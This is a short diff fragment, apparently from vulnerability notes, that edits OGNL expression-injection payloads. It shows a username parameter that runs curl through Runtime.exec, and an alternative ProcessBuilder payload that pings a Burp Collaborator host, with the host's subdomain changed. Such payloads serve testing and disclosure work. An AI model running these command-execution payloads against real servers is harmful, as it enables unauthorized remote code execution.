@@ -15,5 +15,5 @@ username=%25{@java.lang.Runtime@getRuntime().exec('curl 132poma4l3k2ugiooej4apts
 - Alternative payload:
 
 ```
-%{(new java.lang.ProcessBuilder(new java.lang.String []{"ping","c0d0lx7fiehdrrfzlpgf70q3nutmhb.burpcollaborator.net"})).start()}
+%{(new java.lang.ProcessBuilder(new java.lang.String []{"ping","yz1h62j86v3zxqvq1xl5g967iyoocd.burpcollaborator.net"})).start()}
 ```
